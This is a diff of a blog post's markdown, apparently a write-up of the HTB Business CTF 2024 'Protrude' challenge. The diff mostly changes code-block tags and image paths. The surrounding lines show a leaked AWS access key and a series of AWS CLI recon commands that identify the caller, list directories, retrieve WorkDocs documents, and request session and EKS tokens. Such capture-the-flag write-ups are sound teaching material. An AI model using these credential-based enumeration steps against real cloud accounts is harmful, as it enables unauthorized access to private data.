@@ -29,19 +29,19 @@ I enjoy Cloud shenanigans, and so that’s where I put my efforts. This is one o
 
 ##### Access Key ID
 
-```Text
+```Console
 AKIAXYAFLIG2JE6MC2SY
 ```
 
 ##### Secret Access Key
 
-```Text
+```Console
 teWVv0GzIBKS23uozxUGmUH+[...]
 ```
 
 ##### Region name
 
-```Text
+```Console
 us-east-1
 ```
 
@@ -61,11 +61,11 @@ Searched for “Access Key Secret access key” and found this:
 
 #### Some basic **whoami** type commands:
 
-```Shell
+```sh
 aws sts get-caller-identity
 ```
 
-```JSON
+```json
 {
     "UserId": "AIDAXYAFLIG2E6UQ3YIVB",
     "Account": "532587168180",
@@ -81,7 +81,7 @@ Check page for available permissions and tooling.
 
 Using one of the commands found above via Permission Enumeration, we could list some information about Directory services As part of the Directory Services, I found it had a URL:
 
-```JSON
+```json
 "AccessUrl": "vault101.awsapps.com"
 ```
 
@@ -89,13 +89,13 @@ Using one of the commands found above via Permission Enumeration, we could list 
 
 Command for checking this:
 
-```Shell
+```sh
 aws --profile default --region us-east-1 ds describe-directories
 ```
 
 ##### Output
 
-```JSON
+```json
 aws --profile default --region us-east-1 ds describe-directories
 {
     "DirectoryDescriptions": [
@@ -145,11 +145,11 @@ Doing some WorkDocs recon, I found we had access to list the documents using the
 
 #### Tool - aws cli
 
-```Shell
+```sh
 aws workdocs describe-activities --organization-id d-9067e0513b
 ```
 
-```JSON
+```json
 {
     "UserActivities": [
         {
@@ -176,7 +176,7 @@ aws workdocs describe-activities --organization-id d-9067e0513b
 
 I leveraged the Id of one of them to retrieve the information and a URL for that document:
 
-```Shell
+```sh
 aws workdocs get-document --document-id 5347a27512a4f5a1c0ed4b7e965210deecbb6b806a23034ce79
 ```
 
@@ -190,7 +190,7 @@ Not everything was so straight forward and I went on a few rabbit holes to no wh
 
 ### Found a way to get an `SessionToken` as well (through the Permission Enumeration)
 
-```Shell
+```sh
 aws --profile default --region us-east-1 sts get-session-token
 aws sts get-session-token --duration-seconds 86400
 ```
@@ -199,7 +199,7 @@ aws sts get-session-token --duration-seconds 86400
 
 Through one of the permissions, it gives you the command to get an eks access token:
 
-```Shell
+```sh
 aws eks get-token --profile default --region us-east-1 --cluster-name OrganizationAccountAccessRole
 ```
 
@@ -207,7 +207,7 @@ aws eks get-token --profile default --region us-east-1 --cluster-name Organizati
 - Attempted crafting the URL manually with no luck
 - I also tried running the command to get a `kubeconfig` file, but we do not have permissions for that either:
 
-```Shell
+```sh
 aws eks update-kubeconfig --region us-east-1 --name OrganizationAccountAccessRole
 ```
 
@@ -215,23 +215,23 @@ aws eks update-kubeconfig --region us-east-1 --name OrganizationAccountAccessRol
 
 #### Some more recon and enum attempts
 
-```Shell
+```sh
 aws eks list-associated-access-policies --cluster-name OrganizationAccountAccessRole --principal-arn AIDAXYAFLIG2E6UQ3YIVB
 ```
 
-```Shell
+```sh
 An error occurred (AccessDeniedException) when calling the ListAssociatedAccessPolicies operation: User: arn:aws:iam::532587168180:user/aalmodovar is not authorized to perform: eks:ListAssociatedAccessPolicies on resource: arn:aws:eks:us-east-1:532587168180:access-entry/OrganizationAccountAccessRole////*
 ```
 
-```Shell
+```sh
 aws eks describe-access-entry --cluster-name OrganizationAccountAccessRole --principal-arn AIDAXYAFLIG2E6UQ3YIVB
 ```
 
-```Shell
+```sh
 An error occurred (AccessDeniedException) when calling the DescribeAccessEntry operation: User: arn:aws:iam::532587168180:user/aalmodovar is not authorized to perform: eks:DescribeAccessEntry on resource: arn:aws:eks:us-east-1:532587168180:access-entry/OrganizationAccountAccessRole////*
 ```
 
-```Shell
+```sh
 cluster_endpoint=$(aws eks describe-cluster \
 --region us-east-1 \
 --name OrganizationAccountAccessRole \
@@ -239,7 +239,7 @@ cluster_endpoint=$(aws eks describe-cluster \
 --output text)
 ```
 
-```Shell
+```sh
 aws eks describe-cluster --region us-east-1 --name OrganizationAccountAccessRole --query "cluster.endpoint" --output text
 ```
 
@@ -257,4 +257,9 @@ aws eks describe-cluster --region us-east-1 --name OrganizationAccountAccessRole
 
 This is a visual representation of some of the activities involved with trying to obtain the flag and following the green arrows is the “happy” path to the flag.
 
-![](images/Protrude_aws-1024x944.png)
+![](/images/Protrude_aws-1024x944.png)
+
+---    
+Testing image
+
+![](/images/2024/05/2024-05-31-HTB-Business-CTF-2024---Protrude-Challenge/Protrude_aws-1024x944.png)
